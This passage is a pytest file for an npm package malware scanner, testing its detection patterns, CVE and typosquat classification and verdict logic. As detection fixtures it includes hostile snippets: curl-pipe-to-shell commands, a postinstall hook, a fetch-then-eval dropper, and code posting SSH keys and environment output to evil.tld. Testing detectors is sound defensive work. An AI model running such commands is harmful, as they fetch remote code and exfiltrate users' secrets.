    ),
    "hex-obfuscated command": (
        "const c = require('child_process');\n"
        "const s = '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x3a';\n"
        "c.exec(s);\n"
    ),
    "wallet stealer": (
        "const cp = require('child_process');\n"
        "const w = readWallet();\n"
        "cp.exec('bitcoin-cli dumpwallet /tmp/w');\n"
    ),
    "keylogger": "const keylogger = require('./kl');\nkeylogger.start();\n",
    "credential theft": "// steal credentials from the browser store\n",
    # The dot-anchored pattern could not see the destructured form at all.
    "destructured exec with a curl|sh payload": (
        "const { exec } = require('child_process');\n"
        "exec('curl http://evil.tld/x | sh');\n"
    ),
    # --- F35: the fetch/execute wiring, which carries no other signal. Neither
    # of these imports `http`, so the removed context signal never saw them.
    "stage-two fetched and evaluated": (
        "fetch('https://c2.example.tld/stage2')\n"
        "  .then((r) => r.text())\n"
        "  .then((code) => eval(code));\n"
    ),
    "ssh key posted to a remote host": (
        "const { spawnSync } = require('child_process');\n"
        "const out = spawnSync('cat', [home + '/.ssh/id_rsa']).stdout;\n"
        "axios.post('https://evil.tld/collect', { out });\n"
    ),
}


def _classify_one_file(code: str, path: str = "index.js"):
    return classify_malware_hits(
        [(path, desc) for desc in scan_text_for_malware_patterns(code)]
    )


@pytest.mark.parametrize("label", sorted(BENIGN_PACKAGE_CODE))
def test_mainstream_package_code_yields_no_dangers(label):
    """The benign baseline: real code from top-N packages, zero dangers.

    Verified against a real ``npm install`` of 480 packages, which produces
    zero dangers in total; these excerpts pin the specific shapes offline.
    """
    report = _classify_one_file(BENIGN_PACKAGE_CODE[label])

    assert report.dangers == [], (label, report.dangers)


@pytest.mark.parametrize("label", sorted(MALICIOUS_PACKAGE_CODE))
def test_malicious_shapes_are_still_dangers(label):
    """Calibration must not be paid for with detection."""
    report = _classify_one_file(MALICIOUS_PACKAGE_CODE[label])

    assert report.dangers, (label, report.warnings)


def test_regexp_exec_without_child_process_is_not_reported():
    """The gate, stated directly: no `child_process` binding, no exec hit."""
    hits = scan_text_for_malware_patterns("var match = reTrimStart.exec(string);")

    assert "exec() - command execution" not in hits


def test_exec_with_a_child_process_binding_is_reported():
    hits = scan_text_for_malware_patterns(
        "const cp = require('child_process');\ncp.exec(cmd);"
    )

    assert "exec() - command execution" in hits


@pytest.mark.parametrize(
    "binding",
    [
        "const cp = require('child_process');",
        "const cp = require('node:child_process');",
        "import cp from 'child_process';",
        "import { spawn } from 'node:child_process';",
    ],
)
def test_every_child_process_binding_form_opens_the_gate(binding):
    hits = scan_text_for_malware_patterns(f"{binding}\nspawn('git', ['status']);")

    assert "spawn() - process spawning" in hits


def test_gated_pattern_also_catches_the_destructured_form():
    """Being gated is what makes the broader match safe — the dot-anchored
    pattern could not see `exec(cmd)` at all."""
    hits = scan_text_for_malware_patterns(
        "const { exec } = require('child_process');\nexec('id');"
    )

    assert "exec() - command execution" in hits


def test_anonymous_function_is_not_a_function_constructor():
    hits = scan_text_for_malware_patterns("var f = function (a, b) { return a; };")

    assert "Function constructor - dynamic code" not in hits


def test_real_function_constructor_is_still_reported():
    hits = scan_text_for_malware_patterns("var root = Function('return this')();")

    assert "Function constructor - dynamic code" in hits


def test_new_function_constructor_is_still_reported():
    hits = scan_text_for_malware_patterns("const fn = new Function(body);")

    assert "Function constructor - dynamic code" in hits


def test_word_ending_in_eval_is_not_eval():
    assert scan_text_for_malware_patterns("retrieval(key);") == []


def test_a_single_escape_is_not_an_encoded_blob():
    """Asserted as a total absence of hits, not the absence of the new wording:
    the old table reported these under a different description, so a
    substring check would have passed against the very code being replaced."""
    assert scan_text_for_malware_patterns("var s = '\\xc0\\xc1';") == []


def test_a_run_of_escapes_is_an_encoded_blob():
    payload = "var s = '" + "\\x63" * ENCODED_RUN_LENGTH + "';"

    hits = scan_text_for_malware_patterns(payload)

    assert "hex-encoded string blob (possible obfuscation)" in hits


def test_the_word_credentials_alone_is_not_credential_theft():
    hits = scan_text_for_malware_patterns(
        "request.withCredentials = !!config.withCredentials;"
    )

    assert "credential theft" not in hits


def test_credential_theft_needs_a_theft_verb():
    hits = scan_text_for_malware_patterns("// harvest the saved passwords")

    assert "credential theft" in hits


def test_capability_and_context_in_different_files_is_not_corroboration():
    """The build-tool shape: some file shells out, another speaks HTTP.

    Treating that as corroboration is what condemned typescript, webpack,
    eslint and commander.
    """
    hits = [
        ("lib/run.js", "child_process - command execution"),
        ("lib/obfuscated.js", "hex-encoded string blob (possible obfuscation)"),
    ]

    report = classify_malware_hits(hits)

    assert report.dangers == []
    assert report.corroborated == []
    assert len(report.warnings) == 2


def test_capability_and_context_in_the_same_file_is_corroboration():
    hits = [
        ("lib/payload.js", "child_process - command execution"),
        ("lib/payload.js", "network I/O wired to command execution"),
    ]

    report = classify_malware_hits(hits)

    assert report.corroborated == ["child_process - command execution"]
    assert any("child_process" in danger for danger in report.dangers)
    assert any("also shows network/obfuscation" in danger for danger in report.dangers)


def test_corroborated_capabilities_is_empty_without_context():
    assert corroborated_capabilities([("a.js", "child_process - command execution")]) == []


# ---------------------------------------------------------------------------
# F35 — the import is not the signal
#
# `HTTP client` / `HTTPS client` match `require('http')` / `require('https')`.
# Re-measured over 736 installed packages, that pairing escalated 17
# capabilities across 5 packages and every one was false; the import is the
# same code in a dropper and in a dev server. The two `network I/O wired to …`
# patterns say what the set was reaching for instead: the network call and the
# execution sink within NETWORK_EXEC_WINDOW of each other, in either order —
# fetch-then-run is a dropper, run-then-send is exfiltration.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("description", ["HTTP client", "HTTPS client"])
def test_a_module_import_is_not_an_attacker_context_signal(description):
    assert description not in CONTEXT_DESCRIPTIONS
    assert description in {pattern.description for pattern in MALWARE_PATTERN_TABLE}
    assert corroborated_capabilities(
        [("a.js", description), ("a.js", "child_process - command execution")]
    ) == []


def test_fetch_then_execute_is_the_dropper_direction():
    hits = scan_text_for_malware_patterns(
        "const cp = require('child_process');\n"
        "https.get(url, (r) => r.on('end', () => cp.exec(body)));\n"
    )

    assert "network I/O wired to command execution" in hits


def test_execute_then_send_is_the_exfiltration_direction():
    hits = scan_text_for_malware_patterns(
        "const cp = require('child_process');\n"
        "cp.exec('env', (e, out) =>\n"
        "  https.request('https://evil.tld/c', { method: 'POST' }).end(out));\n"
    )

    assert "network I/O wired to command execution" in hits


def test_dynamic_code_execution_needs_no_child_process_binding():
    """`fetch(...).then(eval)` runs no OS command, so the gate must not apply."""
    hits = scan_text_for_malware_patterns(
        "fetch('https://c2.example.tld/s').then((r) => r.text()).then((c) => eval(c));\n"
    )

    assert "network I/O wired to dynamic code execution" in hits
    assert "network I/O wired to command execution" not in hits


def test_command_execution_variant_is_gated_on_a_child_process_binding():
    """Without the binding, `exec(` is as likely to be a RegExp as a command."""
    hits = scan_text_for_malware_patterns(
        "const r = await fetch(payloadUrl);\nexec(await r.text());\n"
    )

    assert "network I/O wired to command execution" not in hits


def test_a_regexp_exec_on_a_fetched_body_is_not_command_execution():
    """The single benign shape closest to the dropper: parse what you fetched.

    The binding is present (the package shells out elsewhere), the network call
    is real, the window is tight, and it still must not fire — which is why the
    sink excludes a dotted plain `exec` on anything but a child_process-shaped
    receiver.
    """
    for receiver in ("RE_VERSION", "/v(\\d+)/", "pattern", "this.re"):
        hits = scan_text_for_malware_patterns(
            "const cp = require('child_process');\n"
            "const body = await (await fetch(registryUrl)).text();\n"
            f"const m = {receiver}.exec(body);\n"
        )

        assert "network I/O wired to command execution" not in hits, receiver


@pytest.mark.parametrize(
    "call",
    [
        "https.get('https://evil.tld/p', cb)",
        "http.get(target, cb)",
        "axios.post(target, body)",
        "axios(opts)",
        "fetch('https://evil.tld/p')",
        "fetch(payloadUrl)",
        "fetch(cfg.endpoint)",
        "new XMLHttpRequest()",
    ],
)
def test_every_network_call_form_wires_to_a_sink(call):
    hits = scan_text_for_malware_patterns(f"{call};\neval(body);\n")

    assert "network I/O wired to dynamic code execution" in hits, call


def test_a_global_fetch_of_an_opaque_variable_is_the_known_blind_spot():
    """The price of dropping the lookbehind, pinned rather than left implicit.

    `fetch(x)` where `x` says nothing about being a URL is indistinguishable
    from `cache.fetch(key)` without a lookbehind, and the lookbehind cost 6x on
    real bundles. Every transport-naming form (`https.get`, `axios`,
    `XMLHttpRequest`, a literal URL) is unaffected — see the parametrised test
    above — so this narrows one shape, not the rule.
    """
    hits = scan_text_for_malware_patterns("fetch(z).then((r) => r.text()).then(eval);\n")

    assert "network I/O wired to dynamic code execution" not in hits


def test_a_fetch_method_on_another_object_is_not_a_network_call():
    hits = scan_text_for_malware_patterns(
        "const cp = require('child_process');\n"
        "const hit = cache.fetch(key);\n"
        "cp.execSync('git status');\n"
    )

    assert not any(h.startswith("network I/O wired") for h in hits)


def test_the_wiring_window_has_an_upper_bound():
    """Far apart is the build-tool shape: some code fetches, other code runs."""
    filler = "\n// unrelated\n" * 60
    assert len(filler) > NETWORK_EXEC_WINDOW

    near = scan_text_for_malware_patterns(
        "const cp = require('child_process');\nhttps.get(u);\ncp.execSync(c);\n"
    )
    far = scan_text_for_malware_patterns(
        f"const cp = require('child_process');\nhttps.get(u);{filler}cp.execSync(c);\n"
    )

    assert "network I/O wired to command execution" in near
    assert "network I/O wired to command execution" not in far


@pytest.mark.parametrize(
    "description",
    ["network I/O wired to dynamic code execution", "network I/O wired to command execution"],
)
def test_the_wiring_patterns_are_dangers_and_corroborate(description):
    """Both roles, since a file can carry the wiring *and* other capabilities."""
    assert is_dangerous_hit(description)
    assert description in CONTEXT_DESCRIPTIONS
    assert corroborated_capabilities(
        [("a.js", description), ("a.js", "eval() - dynamic code execution")]
    ) == ["eval() - dynamic code execution"]


@pytest.mark.parametrize("description", sorted(ALWAYS_DANGEROUS_DESCRIPTIONS))
def test_always_dangerous_descriptions_need_no_context(description):
    report = classify_malware_hits([("a.js", description)])

    assert report.dangers, description
    assert is_dangerous_hit(description)


@pytest.mark.parametrize("description", sorted(CAPABILITY_DESCRIPTIONS))
def test_capability_descriptions_are_not_dangerous_alone(description):
    report = classify_malware_hits([("a.js", description)])

    assert report.dangers == [], description
    assert not is_dangerous_hit(description)


def test_classification_sets_are_anti_drift():
    """Every classified description must exist in the pattern table.

    A typo in one of these sets would silently reclassify a whole family of
    hits — the failure mode the old keyword list had (it carried a "reverse"
    entry that matched no description at all).
    """
    table = {pattern.description for pattern in MALWARE_PATTERN_TABLE}

    for name, described in (
        ("ALWAYS_DANGEROUS_DESCRIPTIONS", ALWAYS_DANGEROUS_DESCRIPTIONS),
        ("CAPABILITY_DESCRIPTIONS", CAPABILITY_DESCRIPTIONS),
        ("CONTEXT_DESCRIPTIONS", CONTEXT_DESCRIPTIONS),
    ):
        assert described <= table, (name, described - table)


def test_a_description_is_never_both_a_capability_and_a_verdict():
    """A capability that is also always-dangerous would make the gate moot."""
    assert not (CAPABILITY_DESCRIPTIONS & ALWAYS_DANGEROUS_DESCRIPTIONS)
    assert not (CAPABILITY_DESCRIPTIONS & CONTEXT_DESCRIPTIONS)


def test_every_pattern_gate_resolves_to_a_registered_gate():
    """A `requires` naming a gate that does not exist would silently disable
    the pattern — a detection hole with every test still green."""
    for pattern in MALWARE_PATTERN_TABLE:
        if pattern.requires:
            assert pattern.requires in sandbox_check._CO_OCCURRENCE_GATES, pattern


def test_every_pattern_regex_compiles_and_is_described_once():
    descriptions = [pattern.description for pattern in MALWARE_PATTERN_TABLE]

    assert len(descriptions) == len(set(descriptions)), "duplicate description"
    for pattern in MALWARE_PATTERN_TABLE:
        re.compile(pattern.regex)


def test_legacy_pattern_view_matches_the_table():
    """`MALWARE_PATTERNS` is the compatibility view; it must not drift."""
    assert MALWARE_PATTERNS == tuple(
        (pattern.regex, pattern.description) for pattern in MALWARE_PATTERN_TABLE
    )


# ---------------------------------------------------------------------------
# CVE classification
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("severity", ["CRITICAL", "HIGH", "critical", "high"])
def test_blocking_severities_become_dangers(severity):
    report = classify_cve_findings(
        [_FakeFinding("CVE-2025-0001", "RCE in dep", _FakeSeverity(severity))]
    )

    assert len(report.dangers) == 1
    assert "CVE-2025-0001" in report.dangers[0]
    assert report.warnings == []


@pytest.mark.parametrize("severity", ["MEDIUM", "LOW", "INFO"])
def test_non_blocking_severities_become_warnings(severity):
    report = classify_cve_findings(
        [_FakeFinding("CVE-2025-0002", "Minor issue", _FakeSeverity(severity))]
    )

    assert report.dangers == []
    assert len(report.warnings) == 1


def test_cve_classification_accepts_a_plain_string_severity():
    """Scanners differ; the classifier must not depend on the enum type."""
    report = classify_cve_findings([_FakeFinding("CVE-2025-3", "x", "HIGH")])

    assert len(report.dangers) == 1


def test_cve_classification_survives_a_finding_missing_fields():
    class _Bare:
        pass

    report = classify_cve_findings([_Bare()])

    assert report.found_any is True
    assert "UNKNOWN" in report.warnings[0]


def test_no_findings_is_not_found_any():
    assert classify_cve_findings([]).found_any is False
    assert classify_cve_findings(None).found_any is False


# ---------------------------------------------------------------------------
# Typosquatting
# ---------------------------------------------------------------------------


def test_typosquat_is_detected():
    matches = typosquat_matches("lodahs")

    assert matches
    assert matches[0][0] == "lodash"
    assert 0.75 < matches[0][1] < 1.0


def test_exact_popular_name_is_not_a_typosquat():
    assert typosquat_matches("lodash") == []
    assert typosquat_matches("react") == []


def test_unrelated_name_is_not_a_typosquat():
    assert typosquat_matches("shellockolm-scanner-fixtures") == []


def test_typosquat_uses_the_bare_name_not_the_version_spec():
    """A version suffix used to dilute the similarity ratio and hide a squat."""
    assert typosquat_matches("lodahs@1.0.0") == typosquat_matches("lodahs")


def test_typosquat_matches_are_sorted_most_similar_first():
    matches = typosquat_matches("expres")

    assert matches
    ratios = [ratio for _, ratio in matches]
    assert ratios == sorted(ratios, reverse=True)


def test_typosquat_on_empty_input_is_empty():
    assert typosquat_matches("") == []


# ---------------------------------------------------------------------------
# End-to-end phase composition (the shapes the CLI actually produces)
# ---------------------------------------------------------------------------


def test_clean_package_run_reaches_safe():
    """Every phase ran and found nothing -> APPEARS SAFE."""
    findings = SandboxFindings()
    script_report = analyze_install_scripts({"test": "jest"})
    findings.extend(dangers=script_report.dangers)
    findings.add_info("No install scripts detected")
    assert filter_suspicious_new_files(["node_modules/lodash/index.js"]) == []
    findings.add_info("No malware patterns detected in code")
    findings.add_info("No known CVEs")

    assert findings.verdict is Verdict.SAFE
    assert "APPEARS SAFE" in build_verdict_summary(findings.verdict, "lodash").body


def test_malicious_package_run_reaches_danger():
    findings = SandboxFindings()
    script_report = analyze_install_scripts(
        {"postinstall": "curl https://evil.tld/x | /bin/sh"}
    )
    findings.extend(dangers=script_report.dangers)
    for path in filter_suspicious_new_files(["node_modules/x/i.js", ".ssh/id_rsa"]):
        findings.add_danger(f"Suspicious file created: {path}")

    assert findings.verdict is Verdict.DANGER
    assert any(".ssh/id_rsa" in d for d in findings.dangers)


@pytest.mark.parametrize(
    "phase,reason",
    [
        ("Metadata analysis", "could not fetch package info"),
        ("Install", "npm install failed"),
        ("Baseline snapshot", "2 path(s) unreadable"),
        ("Post-install snapshot", "2 path(s) unreadable"),
        ("Code analysis", "node_modules/pkg not found"),
        ("Code analysis", "3 installed file(s) unreadable"),
        ("CVE check", "1 CVE scanner(s) failed"),
    ],
)
def test_every_blind_phase_produces_inconclusive(phase, reason):
    """Each way a phase can fail to run must downgrade the verdict.

    These are exactly the sites the inline version either did not mark at all
    (a failed install, an absent package directory, unfetchable metadata, a
    crashed CVE phase) or marked with a flag that had to be kept in sync by
    hand.
    """
    findings = SandboxFindings()
    findings.add_info("No malware patterns detected in code")
    findings.mark_blind(phase, reason)

    assert findings.verdict is Verdict.INCONCLUSIVE
    summary = build_verdict_summary(findings.verdict, "pkg")
    assert "APPEARS SAFE" not in summary.body


# ---------------------------------------------------------------------------
# Anti-drift mechanism guard
# ---------------------------------------------------------------------------


def test_malware_pattern_table_is_defined_once():
    """The pattern tables must live only in sandbox_check.

    If a copy is pasted back into the CLI, the tested table and the shipped one
    can diverge with every test still green.
    """
    sentinels = [
        "Netcat - reverse shell",
        "eval() - dynamic code execution",
        "Function constructor - dynamic code",
        # The F37 danger tier. A copy in the CLI would re-flatten the table
        # there while every test here stayed green.
        "downloaded content piped to a shell",
        "encoded payload executed",
    ]

    for sentinel in sentinels:
        owners = [
            path.name
            for path in SRC_DIR.rglob("*.py")
            if sentinel in path.read_text(encoding="utf-8", errors="ignore")
        ]
        assert owners == ["sandbox_check.py"], (sentinel, owners)


def test_cli_consumes_the_extracted_module():
    """The CLI must call the tested logic, not a re-inlined copy."""
    cli_source = (SRC_DIR / "cli.py").read_text(encoding="utf-8", errors="ignore")

    assert "from sandbox_check import" in cli_source
    assert "build_verdict_summary" in cli_source
    # The hand-synced flag the verdict used to depend on is gone.
    assert "analysis_incomplete = True" not in cli_source


def test_module_is_pure_no_io_imports():
    """sandbox_check must stay free of filesystem/subprocess/console imports."""
    source = Path(sandbox_check.__file__).read_text(encoding="utf-8")

    for forbidden in ("import subprocess", "import shutil", "from rich", "import os"):
        assert forbidden not in source, forbidden
